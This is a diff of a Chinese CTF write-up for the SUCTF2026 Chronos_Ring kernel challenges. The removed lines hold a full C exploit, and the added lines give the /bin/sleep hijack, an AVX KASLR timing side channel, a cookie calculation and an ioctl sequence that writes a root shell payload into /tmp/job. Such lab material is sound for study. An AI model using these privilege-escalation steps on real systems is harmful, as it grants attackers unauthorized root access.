@@ -1,396 +1,212 @@
-# SUCTF2026-Chronos_Ring/SU_Chronos_Ring1
+# SUCTF2026-Chronos_Ring / Chronos_Ring1
 
 ## 题目简述
-题目是 Linux 内核模块利用，两题题干分别为 `a y no , pwn it plz` 和 `Okay, I made a mistake, please visit again`，共享同一条核心利用链。initramfs 中会加载 `chronos_ring.ko`，创建设备 `/dev/chronos_ring`，并让 root 周期性执行 `/tmp/job`；模块通过多个 ioctl 管理上下文、匿名 buffer、用户页绑定、文件 page cache view 和提交操作。
 
-利用目标不是直接在内核里执行 shell，而是先通过与 `kfree` 地址相关的 ioctl 校验打开文件能力，再加载 `/tmp/job` 的 page cache，把匿名 buffer 中的可控脚本内容提交到该页，最终借 root 周期执行 `/tmp/job` 实现提权。
+这两个题目使用同一套 Linux 内核环境：启动脚本加载 `chronos_ring.ko`，把 `/dev/chronos_ring` 设为 `0666`，并让 root 每 3 秒执行一次 `/tmp/job`。
+
+官方资料给出的预期层次不同：
+
+- `Chronos_Ring` 是配置型捷径：`/bin` 目录可写，而 root 定时任务会调用 `sleep`，替换 `/bin/sleep` 即可让 root 修改 `/flag` 权限；
+- `Chronos_Ring1` 是内核利用：先用 AVX 时序侧信道恢复 KASLR，再绕过与 `kfree` 地址绑定的 cookie，最后利用 `chronos_ring` 状态机把脚本写入 `/tmp/job` 的 page cache。
+
+仓库归档中的两个 `chronos_ring.ko` 和两个 `initramfs.cpio.gz` 哈希分别相同，参赛队总 WP 也用同一条内核链打通了两个实例。本文因此合并记录，但会区分简单题的官方捷径、Ring1 的官方预期链，以及源码中实际存在的更短利用路径。
 
 ## 解题过程
-SU_Chronos_Ring 和 SU_Chronos_Ring1 用了同一个 exp 就可以打了, 应该是预期解吧.
 
-解开 initramfs，查看 init 中关键逻辑如下：
+### 1. 启动环境与攻击目标
+
+`init` 中的关键逻辑为：
 
 ```sh
 insmod /chronos_ring.ko
 chmod 666 /dev/chronos_ring
 
-echo "#!/bin/sh" > /tmp/job
+echo '#!/bin/sh' > /tmp/job
 echo "echo 'Root helper is running safely...'" >> /tmp/job
 chmod 644 /tmp/job
 (
-while true; do
-/bin/sh /tmp/job > /dev/null 2>&1
-sleep 3
-done
+    while true; do
+        /bin/sh /tmp/job > /dev/null 2>&1
+        sleep 3
+    done
 ) &
 ```
 
-系统启动后，root 会周期性执行 /tmp/job ，模块设备 /dev/chronos_ring 被设置为 world
-writable。
+`/flag` 的属主是 root、权限为 `0400`。因此不论走配置漏洞还是内核漏洞，最终目标都是劫持 root 周期任务：让它修改 `/flag` 权限，或复制 flag 到普通用户可读的位置。
 
-模块反编译，主要逻辑集中在 chronos_ioctl 。可以整理出这一组 ioctl：0x1001 创建上下文
-和匿名 buffer，0x1002 通过与 kfree 地址相关的校验后开启文件相关能力，0x1003 调用
-pin_user_pages_fast 绑定一个用户页，0x1004 加载某个特定文件的 page cache，
-0x1005 基于当前状态构建 view，0x1007 向匿名 buffer 写入数据，0x1008 将匿名 buffer 的
-内容提交到 view 指向的对象上。
+### 2. Chronos_Ring：利用可写的 `/bin`
 
-0x1002 的核心校验如下：
+initramfs 中 `/bin` 的权限为 `0777`。启动时执行 `busybox --install -s`，所以 `/bin/sleep` 是指向 BusyBox 的符号链接。不能直接用重定向覆盖该链接，否则会沿链接截断 `/bin/busybox`；应先删除链接，再创建独立脚本：
 
-```
-n_2 = 0;
-src = 0;
-v10 = copy_from_user(&src, a3, 16);
-result = -14;
-if ( v10 )
-return result;
-result = -1;
-if ( ((unsigned int)n_2 ^ src ^ ((unsigned __int64)&kfree >> 4) &
-0xFFFFFFFFFFFE0000LL) != 0xF372FE94F82B3C6ELL )
-return result;
-raw_spin_lock(::ctx);
-ctx_2 = ::ctx;
-*(_DWORD *)(::ctx + 16) |= 1u;
-*(_DWORD *)(ctx_2 + 20) = n_2;
+```sh
+rm /bin/sleep
+cat > /bin/sleep <<'EOF'
+#!/bin/sh
+chmod 644 /flag
+EOF
+chmod 755 /bin/sleep
 ```
 
-要求构造一个与 kfree 地址相关的 key，否则不会开启后续文件相关能力。由于开启了 kaslr ，
-不能直接使用固定地址。直接从 bzImage 提取内核本体，恢复 __ksymtab 和
-__ksymtab_strings ，得到 kfree 的静态地址，再按 2MB 粒度枚举 KASLR slide。最终得到的
-静态地址为：
+后台 root shell 下一次执行 `sleep 3` 时会运行该脚本。随后读取：
 
-```
-kfree = 0xffffffff813762b0
+```sh
+cat /flag
 ```
 
-因此 key 的构造可以写成：
+这条路径不需要分析内核模块，是 `Chronos_Ring` 官方 README 所指的初级解法。识别重点不是“某个二进制本身可写”，而是 root 的 `PATH` 中存在普通用户可替换的命令入口。
 
-```
-((KFREE_STATIC + slide) >> 4) & 0xfffffffffffe0000ULL
-```
+### 3. Ring1 的 ioctl 状态机
 
-再与 0xF372FE94F82B3C6E 异或即可。
+最终源码定义了以下接口：
 
-0x1002 之后，需要确定 0x1004 能加载的文件。反编译显示对文件名做了一次 FNV1a 校验：
+| ioctl | 作用 |
+|---|---|
+| `0x1001 CHRONOS_REG_BUF` | 创建一页大小的本地 `local_ring` |
+| `0x1002 CHRONOS_SET_OPTS` | 校验 KASLR 相关 cookie，打开 gate |
+| `0x1003 CHRONOS_PIN_USER_PAGE` | pin 一个用户页；这是开启同步的前置条件 |
+| `0x1004 CHRONOS_ATTACH_FILE` | 挂接指定文件的 page cache 页 |
+| `0x1005 CHRONOS_ENABLE_SYNC` | 创建 private 或 file-backed `sync_view` |
+| `0x1006 CHRONOS_DETACH_FILE` | 解除文件绑定并把模式退回 LOCAL |
+| `0x1007 CHRONOS_UPDATE_BUF` | 仅在 LOCAL 模式下写 `local_ring` |
+| `0x1008 CHRONOS_COMMIT_SYNC` | 把 `local_ring` 内容复制到 `sync_view` |
 
-```
-v41 = *(unsigned __int8 **)(*v40 + 40LL);
-v42 = *v41;
-if ( !*v41 )
-goto LABEL_102;
-v43 = v41 + 1;
-v44 = -2128831035;
-do
-{
-
-v44 = 16777619 * (v44 ^ v42);
-v42 = *v43++;
-}
-while ( v42 );
-if ( v44 != -573296676 )
-{
-LABEL_102:
-fput(v40);
-return -13;
-}
-```
-
-将该 hash 对应回字符串，结合前面 init 的内容，可得到目标文件名就是 job 。
-
-0x1005 构建 view 时，如果当前上下文里挂的是文件页，则生成的 view 类型为 2 ，view 地址直
-接指向该文件页的 direct map 地址。逻辑如下：
-
-```
-if ( v6 && (*(_BYTE *)(::ctx + 16) & 2) != 0 )
-{
-...
-if ( *((_DWORD *)v6 + 6) == 1 )
-{
-v48 = *((_QWORD *)v6 + 6);
-if ( v48 )
-{
-...
-*((_QWORD *)v7 + 1) = v50;
-*(_QWORD *)v7 = page_offset_base + ((v50 - vmemmap_base) << 6);
-n2 = 2;
-goto LABEL_113;
-}
-}
-...
-LABEL_113:
-v7[4] = n2;
-*((_DWORD *)v6 + 20) = n2;
-v54 = *((_QWORD *)v6 + 9);
-*((_QWORD *)v6 + 9) = v7;
-raw_spin_unlock(::ctx);
-if ( v54 )
-call_rcu(v54 + 24, destroy_super_rcu);
-return 0;
-}
-```
-
-0x1008 的作用是把匿名 buffer 中的数据拷贝到 view 指向的位置；当 view 类型为 2 时，对目标
-页调用 set_page_dirty() ：
-
-```javascript
-if ( *(_QWORD *)v35 )
-{
-memcpy(
-(void *)(HIDWORD(n_2) + *(_QWORD *)v35),
-(const void *)(*((_QWORD *)v34 + 1) + HIDWORD(n_2)),
-(unsigned int)n_2);
-if ( *((_DWORD *)v35 + 4) == 2 )
-set_page_dirty(*((_QWORD *)v35 + 1));
-}
-```
-
-于是, 可以先在匿名 buffer 中准备内容，再将 /tmp/job 的 page cache 挂到上下文里，随后构造
-file-backed view，最后把匿名 buffer 的内容提交到 /tmp/job 的 page cache。由于 root 会周期性
-执行 /tmp/job ，因此只需要把 page cache 中的脚本替换即可。
-
-### exp:
+`ATTACH_FILE` 并不按完整路径比较，而是对文件 basename 做 FNV-1a：
 
 ```c
-#define _GNU_SOURCE
-#include <fcntl.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <sys/mman.h>
-#include <unistd.h>
-
-#define CHRONOS_CREATE 0x1001
-#define CHRONOS_UNLOCK_FILE 0x1002
-#define CHRONOS_PIN_USER 0x1003
-#define CHRONOS_LOAD_FILE 0x1004
-#define CHRONOS_BUILD_VIEW 0x1005
-#define CHRONOS_BUF_WRITE 0x1007
-#define CHRONOS_VIEW_COMMIT 0x1008
-
-#define KFREE_STATIC 0xffffffff813762b0ULL
-#define KASLR_STEP 0x200000ULL
-#define MAX_KASLR_STEPS 1024
-#define MAGIC_CONST 0xf372fe94f82b3c6eULL
-
-struct unlock_req {
-
-uint64_t key;
-uint32_t aux;
-uint32_t pad;
-};
-
-static void die(const char *msg)
-{
-perror(msg);
-exit(1);
-}
-
-static uint64_t unlock_key(uint64_t slide)
-{
-uint64_t masked = ((KFREE_STATIC + slide) >> 4) & 0xfffffffffffe0000ULL;
-return MAGIC_CONST ^ masked;
-}
-
-int main(void)
-{
-static char payload[64] = "chmod 644 /flag\n";
-struct unlock_req req = { 0 };
-uint64_t write_req[2] = { (uint64_t)(uintptr_t)payload, 64 };
-uint64_t commit_req[2] = { 0, 64 };
-int devfd = open("/dev/chronos_ring", O_RDWR);
-int jobfd;
-void *page;
-uint64_t file_arg;
-
-if (devfd < 0) {
-die("open /dev/chronos_ring");
-}
-if (ioctl(devfd, CHRONOS_CREATE, 0) != 0) {
-die("CHRONOS_CREATE");
-}
-
-for (uint64_t i = 0; i < MAX_KASLR_STEPS; i++) {
-req.key = unlock_key(i * KASLR_STEP);
-if (ioctl(devfd, CHRONOS_UNLOCK_FILE, &req) == 0) {
-break;
-}
-if (i + 1 == MAX_KASLR_STEPS) {
-fputs("unlock failed\n", stderr);
-return 1;
-}
-}
-
-page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
-
-MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-if (page == MAP_FAILED) {
-die("mmap");
-}
-if (ioctl(devfd, CHRONOS_PIN_USER, &page) != 0) {
-die("CHRONOS_PIN_USER");
-}
-if (ioctl(devfd, CHRONOS_BUF_WRITE, write_req) != 0) {
-die("CHRONOS_BUF_WRITE");
-}
-
-jobfd = open("/tmp/job", O_RDONLY);
-if (jobfd < 0) {
-die("open /tmp/job");
-}
-file_arg = (uint32_t)jobfd;
-if (ioctl(devfd, CHRONOS_LOAD_FILE, &file_arg) != 0) {
-die("CHRONOS_LOAD_FILE");
-}
-if (ioctl(devfd, CHRONOS_BUILD_VIEW, 0) != 0) {
-die("CHRONOS_BUILD_VIEW");
-}
-if (ioctl(devfd, CHRONOS_VIEW_COMMIT, commit_req) != 0) {
-die("CHRONOS_VIEW_COMMIT");
-}
-
-sleep(4);
-execl("/bin/cat", "cat", "/flag", NULL);
-die("execl /bin/cat");
+static bool chronos_is_target_name(struct file *f) {
+    return chronos_fnv1a(f->f_path.dentry->d_name.name) == 0xddd42fdc;
 }
 ```
 
-musl-gcc 编译为静态文件后上传即可:
+`0xddd42fdc` 对应字符串 `job`，结合启动脚本即可确定目标是 `/tmp/job`。
+
+### 4. 用 AVX 时序侧信道绕过 KASLR gate
+
+最终源码中的 cookie 公式为：
+
+```c
+material = (uint64_t)kfree >> 21;
+cookie = rol64(material ^ 0x9e3779b97f4a7c15, 17) ^ session_idx;
+```
+
+内核中 `kfree` 相对基址的偏移为 `0x3762b0`。环境没有直接地址泄漏，官方 exp 使用 `vmaskmovps` masked load 测量候选内核地址的访问时延：已映射、热点内核页与未映射地址会呈现可统计的时序差异。
+
+侧信道最小流程是：
+
+1. 在 `0xffffffff80000000` 至 `0xffffffffc0000000` 范围按固定步长扫描；
+2. 每个地址先经过序列化 syscall，再用 `rdtsc` 包围 `vmaskmovps`；
+3. 丢弃若干预热轮，对约 100 轮结果求均值；
+4. 取耗时最低的热点地址，多次扫描降低噪声；
+5. 官方样例把热点地址减去约 `0x1600000` 得到内核基址，再加 `0x3762b0` 得到 `kfree`；若机器噪声导致热点漂移，应在结果附近按 2 MiB 对齐枚举候选 base，并以 `CHRONOS_SET_OPTS` 返回值作 oracle。
+
+计算代码如下：
+
+```c
+static inline uint64_t rol64(uint64_t value, unsigned shift) {
+    return (value << shift) | (value >> (64 - shift));
+}
+
+uint64_t kfree_addr = kernel_base + 0x3762b0;
+uint32_t session_idx = 0x1337;
+uint64_t cookie = rol64(
+    (kfree_addr >> 21) ^ 0x9e3779b97f4a7c15ULL,
+    17
+) ^ session_idx;
+
+struct chronos_set_opts_req opts = {
+    .cookie = cookie,
+    .session_idx = session_idx,
+};
+ioctl(fd, CHRONOS_SET_OPTS, &opts);
+```
+
+参赛队总 WP 对比赛样本反编译得到的是另一版 `0x1002` 校验：把 `kfree` 地址掩码后与 `0xf372fe94f82b3c6e` 异或，并按 2 MiB slide 枚举。该公式与仓库最终源码及官方 exp 不一致，说明附件版本发生过变化；复现仓库版本时应使用上面的 `rol64` 公式，不能混用旧样本常量。
+
+### 5. 官方预期：状态与 view 生命周期错配
+
+`ENABLE_SYNC` 在 FILE 模式下会为 `sync_view` 保存文件 page，并额外 `get_page()`：
+
+```c
+get_page(buf->file_page);
+new_view->page = buf->file_page;
+new_view->vaddr = kmap(new_view->page);
+new_view->type = VIEW_FILE_BACKED;
+rcu_assign_pointer(buf->sync_view, new_view);
+```
+
+随后 `DETACH_FILE` 把模式改回 LOCAL，并释放 `attached_file` 和 `file_page`，却没有清理 `sync_view`：
+
+```c
+buf->mode = CHRONOS_MODE_LOCAL;
+fput(buf->attached_file);
+put_page(buf->file_page);
+buf->sync_state = SYNC_DISABLED;
+/* buf->sync_view 仍保留 */
+```
+
+这里更准确的描述是“残留的 file-backed view”或“状态/授权错配”，不是内存 UAF：`sync_view` 自己持有的 page 引用仍然有效。漏洞在于逻辑状态已经宣称同步禁用、模式已经退回 LOCAL，但 `COMMIT_SYNC` 不检查 `mode` 或 `sync_state`，仍会通过 RCU 解引用旧 view：
+
+```c
+rcu_read_lock();
+view = rcu_dereference(buf->sync_view);
+if (view && view->vaddr) {
+    memcpy(view->vaddr + req.off,
+           buf->local_ring + req.off,
+           req.len);
+    if (view->type == VIEW_FILE_BACKED)
+        set_page_dirty(view->page);
+}
+rcu_read_unlock();
+```
+
+官方 exp 的完整顺序为：
 
 ```text
-# SUCTF2026-Chronos_Ring
-❯ py upload.py
-[+] Opening connection to <target> on port 10000: Done
-/home/neptune/suctf2026/pwn/SU_Chronos_Ring/upload.py:21: BytesWarning: Text
-is not bytes; assuming ASCII, no guarantees. See htts
-p.sendline(cmd)
-[*] Uploading exploit (23928 bytes)...
-[*] Progress: 2% (512/23928)
-[*] Progress: 4% (1024/23928)
-[*] Progress: 6% (1536/23928)
-[*] Progress: 8% (2048/23928)
-
-[*] Progress: 10% (2560/23928)
-[*] Progress: 12% (3072/23928)
-[*] Progress: 14% (3584/23928)
-[*] Progress: 17% (4096/23928)
-[*] Progress: 19% (4608/23928)
-[*] Progress: 21% (5120/23928)
-[*] Progress: 23% (5632/23928)
-[*] Progress: 25% (6144/23928)
-[*] Progress: 27% (6656/23928)
-[*] Progress: 29% (7168/23928)
-[*] Progress: 32% (7680/23928)
-[*] Progress: 34% (8192/23928)
-[*] Progress: 36% (8704/23928)
-[*] Progress: 38% (9216/23928)
-[*] Progress: 40% (9728/23928)
-[*] Progress: 42% (10240/23928)
-[*] Progress: 44% (10752/23928)
-[*] Progress: 47% (11264/23928)
-[*] Progress: 49% (11776/23928)
-[*] Progress: 51% (12288/23928)
-[*] Progress: 53% (12800/23928)
-[*] Progress: 55% (13312/23928)
-[*] Progress: 57% (13824/23928)
-[*] Progress: 59% (14336/23928)
-[*] Progress: 62% (14848/23928)
-[*] Progress: 64% (15360/23928)
-[*] Progress: 66% (15872/23928)
-[*] Progress: 68% (16384/23928)
-[*] Progress: 70% (16896/23928)
-[*] Progress: 72% (17408/23928)
-[*] Progress: 74% (17920/23928)
-[*] Progress: 77% (18432/23928)
-[*] Progress: 79% (18944/23928)
-[*] Progress: 81% (19456/23928)
-[*] Progress: 83% (19968/23928)
-[*] Progress: 85% (20480/23928)
-[*] Progress: 87% (20992/23928)
-[*] Progress: 89% (21504/23928)
-[*] Progress: 92% (22016/23928)
-[*] Progress: 94% (22528/23928)
-[*] Progress: 96% (23040/23928)
-[*] Progress: 98% (23552/23928)
-[*] Progress: 100% (23928/23928)
-[+] Upload complete! Decoding...
-[+] Launching exploit...
-/home/neptune/suctf2026/pwn/SU_Chronos_Ring/upload.py:45: BytesWarning: Text
-is not bytes; assuming ASCII, no guarantees. See htts
-
-p.sendline("/tmp/exploit")
-[*] Switching to interactive mode
-\x1b[6n/tmp/exploit
-SUCTF{VGhhc19BU19XSEFUX1Vfd0FudF9mbGFnX2ZsYWdfZmxhZyEhIQ==}[ctf@SUCTF2026
-/tmp]$ \x1b[6n$
-
-# SUCTF2026-Chronos_Ring1
-❯ py upload.py
-[+] Opening connection to <target> on port 10001: Done
-/home/neptune/suctf2026/pwn/SU_Chronos_Ring1/upload.py:21: BytesWarning: Text
-is not bytes; assuming ASCII, no guarantees. See hts
-p.sendline(cmd)
-[*] Uploading exploit (23928 bytes)...
-[*] Progress: 2% (512/23928)
-[*] Progress: 4% (1024/23928)
-[*] Progress: 6% (1536/23928)
-[*] Progress: 8% (2048/23928)
-[*] Progress: 10% (2560/23928)
-[*] Progress: 12% (3072/23928)
-[*] Progress: 14% (3584/23928)
-[*] Progress: 17% (4096/23928)
-[*] Progress: 19% (4608/23928)
-[*] Progress: 21% (5120/23928)
-[*] Progress: 23% (5632/23928)
-[*] Progress: 25% (6144/23928)
-[*] Progress: 27% (6656/23928)
-[*] Progress: 29% (7168/23928)
-[*] Progress: 32% (7680/23928)
-[*] Progress: 34% (8192/23928)
-[*] Progress: 36% (8704/23928)
-[*] Progress: 38% (9216/23928)
-[*] Progress: 40% (9728/23928)
-[*] Progress: 42% (10240/23928)
-[*] Progress: 44% (10752/23928)
-[*] Progress: 47% (11264/23928)
-[*] Progress: 49% (11776/23928)
-[*] Progress: 51% (12288/23928)
-[*] Progress: 53% (12800/23928)
-[*] Progress: 55% (13312/23928)
-[*] Progress: 57% (13824/23928)
-[*] Progress: 59% (14336/23928)
-[*] Progress: 62% (14848/23928)
-[*] Progress: 64% (15360/23928)
-[*] Progress: 66% (15872/23928)
-[*] Progress: 68% (16384/23928)
-[*] Progress: 70% (16896/23928)
-[*] Progress: 72% (17408/23928)
-
-[*] Progress: 74% (17920/23928)
-[*] Progress: 77% (18432/23928)
-[*] Progress: 79% (18944/23928)
-[*] Progress: 81% (19456/23928)
-[*] Progress: 83% (19968/23928)
-[*] Progress: 85% (20480/23928)
-[*] Progress: 87% (20992/23928)
-[*] Progress: 89% (21504/23928)
-[*] Progress: 92% (22016/23928)
-[*] Progress: 94% (22528/23928)
-[*] Progress: 96% (23040/23928)
-[*] Progress: 98% (23552/23928)
-[*] Progress: 100% (23928/23928)
-[+] Upload complete! Decoding...
-[+] Launching exploit...
-/home/neptune/suctf2026/pwn/SU_Chronos_Ring1/upload.py:45: BytesWarning: Text
-is not bytes; assuming ASCII, no guarantees. See hts
-p.sendline("/tmp/exploit")
-[*] Switching to interactive mode
-\x1b[6n/tmp/exploit
-SUCTF{JEQG2YLEMUQGCIDNNFZXIYLLMUWCASJANBXXAZJAPFXXKIDXN5XCO5BANVQWWZJANF2A====}
-[ctf@SUCTF2026 /tmp]$ \x1b[6n$
+SET_OPTS(cookie)
+REG_BUF
+PIN_USER_PAGE
+ATTACH_FILE(/tmp/job, page 0)
+ENABLE_SYNC
+DETACH_FILE                 # 回到 LOCAL，但保留 file-backed view
+UPDATE_BUF(shell script)    # LOCAL 状态下允许写 local_ring
+COMMIT_SYNC                 # 仍写入 /tmp/job 的 page cache
 ```
 
+payload 可以是：
+
+```sh
+#!/bin/sh
+cp /flag /tmp/flag
+chmod 777 /tmp/flag
+exit
+```
+
+等待后台任务执行后读取 `/tmp/flag` 即可。
+
+### 6. 源码中还存在无需 DETACH 的短链
+
+逐函数检查可以发现，官方预期的 `DETACH_FILE` 并非必要条件：`UPDATE_BUF` 只检查调用当时是否为 LOCAL，而 `COMMIT_SYNC` 不检查提交时的 mode、同步状态或文件写权限。因此可以先写本地 buffer，再挂接文件并提交：
+
+```text
+SET_OPTS(cookie)
+REG_BUF
+PIN_USER_PAGE
+UPDATE_BUF(shell script)    # 此时仍是 LOCAL
+ATTACH_FILE(/tmp/job, 0)
+ENABLE_SYNC                 # 获得 file-backed view
+COMMIT_SYNC                 # 直接覆盖只读打开的 page cache
+```
+
+参赛队总 WP 使用的就是这一思路：先准备匿名 buffer，再建立 `/tmp/job` 的 file-backed view，最后 commit。它说明根本问题不只在 `DETACH_FILE` 漏清指针，还在于：
+
+- `ATTACH_FILE` 接受 `O_RDONLY` 文件，却允许后续获得可写 kmap；
+- `COMMIT_SYNC` 没有重新验证当前状态和写权限；
+- `UPDATE_BUF` 与 `COMMIT_SYNC` 的授权条件可以跨状态拼接。
+
+因此，审计状态机时不能只看每个 ioctl 单独是否合理，还要检查攻击者能否把不同时间点满足的条件组合成越权序列。
+
 ## 方法总结
-- 核心技巧：内核 ioctl 状态机 + page cache 写入
-- 识别信号：设备节点可写、root 周期执行某个文件，ioctl 能 pin 用户页、加载文件页并 commit view。
-- 复用要点：先绕过与 `kfree` 地址相关的 KASLR 校验，再构造 file-backed view，把 payload 写进 page cache。
+
+`Chronos_Ring` 的最短解法是配置审计：root 定时任务调用的命令位于普通用户可写目录，替换 `/bin/sleep` 即可获得读取 flag 的权限。`Chronos_Ring1` 则先用 AVX masked-load 时序差异恢复 KASLR，按最终源码的 `rol64((kfree >> 21) ^ constant, 17) ^ session_idx` 公式打开 gate，再利用 page cache 同步逻辑改写 `/tmp/job`。
+
+内核部分真正可复用的经验有两点。第一，RCU 保护只保证对象访问期的内存安全，不会自动保证业务状态正确；这里的 view 仍然存活，但已经不应再获得提交权限。第二，状态机漏洞要按调用序列审计：即使官方预期是 `ATTACH → ENABLE → DETACH → UPDATE → COMMIT`，源码还允许 `UPDATE → ATTACH → ENABLE → COMMIT`，后者揭示了更基础的跨状态授权缺失。遇到官方 WP、比赛总 WP 与归档源码不一致时，应固定样本版本，并以对应源码和二进制的实际公式为准。
